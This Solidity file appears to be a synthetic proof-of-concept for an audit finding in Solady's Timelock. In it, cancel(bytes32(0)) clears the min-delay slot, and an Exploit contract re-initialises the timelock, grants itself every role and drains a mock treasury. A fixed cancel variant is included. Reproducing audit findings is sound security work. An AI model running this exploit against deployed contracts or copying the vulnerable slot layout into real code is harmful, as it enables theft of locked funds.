// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Solady Timelock — cancel(bytes32(0)) clears the min-delay slot
    (Spearbit / Coinbase, finding #45408)
    SYNTHETIC, cheatcode-free reduction. cancel() and initialize()'s
    slot guard are the audited assembly. An odd min delay is stored as
    bitwise NOT, so its least significant bit is 0 and cancel(0) wipes
    the slot. initialize() can then run again. */

contract MockToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Treasury {
    MockToken public token;
    address public timelock;

    constructor(MockToken token_, address timelock_) {
        token = token_;
        timelock = timelock_;
    }

    function pay(address to, uint256 amt) external {
        require(msg.sender == timelock, "only timelock");
        token.transfer(to, amt);
    }
}

contract Sink {}

contract Timelock {
    uint256 public constant ADMIN_ROLE = 0;
    uint256 public constant PROPOSER_ROLE = 1;
    uint256 public constant EXECUTOR_ROLE = 2;
    uint256 public constant CANCELLER_ROLE = 3;

    /// @dev Slot of operation `id` is `xor(shl(72, id), _TIMELOCK_SLOT)`.
    /// The slot itself stores `not(minDelay)`.
    uint256 private constant _TIMELOCK_SLOT = 0x477f2812565c76a73f;

    uint256 private constant _CANCELLED_EVENT_SIGNATURE =
        0xbaa1eb22f2a492ba1a5fea61b8df4d27c6c8b5f3971e63bb58fa14ff72eedb70;

    mapping(address => mapping(uint256 => bool)) public roles;

    struct Op {
        address target;
        address to;
        uint256 amount;
    }

    mapping(bytes32 => Op) public ops;

    error EnumerableRolesUnauthorized();

    modifier onlyRole(uint256 role) {
        if (!roles[msg.sender][role]) revert EnumerableRolesUnauthorized();
        _;
    }

    function initialize(
        uint256 initialMinDelay,
        address initialAdmin,
        address[] calldata proposers,
        address[] calldata executors,
        address[] calldata cancellers
    ) public virtual {
        /// @solidity memory-safe-assembly
        assembly {
            if shr(254, initialMinDelay) {
                mstore(0x00, 0xd1efaf25) // `TimelockDelayOverflow()`.
                revert(0x1c, 0x04)
            }
            let s := _TIMELOCK_SLOT
            if sload(s) {
                mstore(0x00, 0xc44f149c) // `TimelockAlreadyInitialized()`.
                revert(0x1c, 0x04)
            }
            sstore(s, not(initialMinDelay))
        }
        if (initialAdmin != address(0)) {
            _setRole(initialAdmin, ADMIN_ROLE, true);
        }
        _bulkSetRole(proposers, PROPOSER_ROLE, true);
        _bulkSetRole(executors, EXECUTOR_ROLE, true);
        _bulkSetRole(cancellers, CANCELLER_ROLE, true);
    }

    function cancel(bytes32 id) public virtual onlyRole(CANCELLER_ROLE) {
        // @> VULN: bytes32(0) selects _TIMELOCK_SLOT; this block sstores 0 over the min-delay word
        assembly {
            let s := xor(shl(72, id), _TIMELOCK_SLOT) // Operation slot.
            let p := sload(s)
            if or(and(1, p), iszero(p)) {
                mstore(0x00, 0xd639b0bf) // `TimelockInvalidOperation(bytes32,uint256)`.
                mstore(0x20, id)
                mstore(0x40, 6) // `(1 << OperationState.Waiting) | (1 << OperationState.Ready)`
                revert(0x1c, 0x44)
            }
            sstore(s, 0) // Clears the operation's storage slot. bytes32(0) clears _TIMELOCK_SLOT.
            // FIX: s := keccak256(abi.encodePacked(id, bytes9(_TIMELOCK_SLOT)))
            log2(0x00, 0x00, _CANCELLED_EVENT_SIGNATURE, id)
        }
    }

    /// Post-fix slot: hashing the id cannot land on `_TIMELOCK_SLOT`.
    function cancelFixed(bytes32 id) public onlyRole(CANCELLER_ROLE) {
        /// @solidity memory-safe-assembly
        assembly {
            mstore(0x09, _TIMELOCK_SLOT)
            mstore(0x00, id)
            let s := keccak256(0x00, 0x29)
            let p := sload(s)
            if or(and(1, p), iszero(p)) {
                mstore(0x00, 0xd639b0bf)
                mstore(0x20, id)
                mstore(0x40, 6)
                revert(0x1c, 0x44)
            }
            sstore(s, 0)
        }
    }

    function minDelay() public view virtual returns (uint256 result) {
        /// @solidity memory-safe-assembly
        assembly {
            result := not(sload(_TIMELOCK_SLOT))
        }
    }

    function rawSlot() public view returns (uint256 result) {
        /// @solidity memory-safe-assembly
        assembly {
            result := sload(_TIMELOCK_SLOT)
        }
    }

    function hasRole(address user, uint256 role) external view returns (bool) {
        return roles[user][role];
    }

    function propose(address target, address to, uint256 amount, uint256 delay)
        external
        onlyRole(PROPOSER_ROLE)
        returns (bytes32 id)
    {
        uint256 t = minDelay();
        require(delay >= t, "delay");
        id = keccak256(abi.encode(target, to, amount));
        uint256 ready = block.timestamp + delay;
        assembly {
            let s := xor(shl(72, id), _TIMELOCK_SLOT)
            if sload(s) { revert(0, 0) }
            sstore(s, shl(1, ready))
        }
        ops[id] = Op({target: target, to: to, amount: amount});
    }

    function execute(bytes32 id) external onlyRole(EXECUTOR_ROLE) {
        Op memory op = ops[id];
        assembly {
            let s := xor(shl(72, id), _TIMELOCK_SLOT)
            let p := sload(s)
            if or(or(and(1, p), iszero(p)), lt(timestamp(), shr(1, p))) {
                revert(0, 0)
            }
        }
        Treasury(op.target).pay(op.to, op.amount);
        assembly {
            let s := xor(shl(72, id), _TIMELOCK_SLOT)
            let p := sload(s)
            sstore(s, or(1, p))
        }
    }

    function _setRole(address user, uint256 role, bool active) internal {
        roles[user][role] = active;
    }

    function _bulkSetRole(address[] calldata users, uint256 role, bool active) internal {
        for (uint256 i; i < users.length; ++i) {
            _setRole(users[i], role, active);
        }
    }
}

contract Exploit {
    MockToken public token; // CREATE nonce 1
    Timelock public tl; // CREATE nonce 2
    Treasury public treasury; // CREATE nonce 3
    Sink public sink; // CREATE nonce 4
    address public constant ADMIN = address(0xA11CE);

    constructor() {
        token = new MockToken("TL", "TL", 18);
        tl = new Timelock();
        treasury = new Treasury(token, address(tl));
        sink = new Sink();
        token.mint(address(treasury), 1000 ether);
        address[] memory proposers = new address[](1);
        proposers[0] = ADMIN;
        address[] memory executors = new address[](1);
        executors[0] = ADMIN;
        address[] memory cancellers = new address[](1);
        cancellers[0] = address(this);
        tl.initialize(1001, ADMIN, proposers, executors, cancellers);
    }

    function run() external {
        require(tl.minDelay() == 1001, "pre delay");
        require(tl.hasRole(address(this), tl.CANCELLER_ROLE()), "pre canceller");
        require(!tl.hasRole(address(this), tl.PROPOSER_ROLE()), "pre proposer");
        require(!tl.hasRole(address(this), tl.EXECUTOR_ROLE()), "pre executor");
        tl.cancel(bytes32(0));
        require(tl.rawSlot() == 0, "slot not cleared");
        address[] memory me = new address[](1);
        me[0] = address(this);
        tl.initialize(0, address(this), me, me, me);
        require(tl.hasRole(address(this), tl.PROPOSER_ROLE()), "not proposer");
        require(tl.hasRole(address(this), tl.EXECUTOR_ROLE()), "not executor");
        require(tl.minDelay() == 0, "delay not zero");
        bytes32 id = tl.propose(address(treasury), address(sink), 1000 ether, 0);
        tl.execute(id);
        uint256 taken = token.balanceOf(address(sink));
        uint256 left = token.balanceOf(address(treasury));
        require(taken == 1000 ether, "sink");
        require(left == 0, "treasury");
    }
}
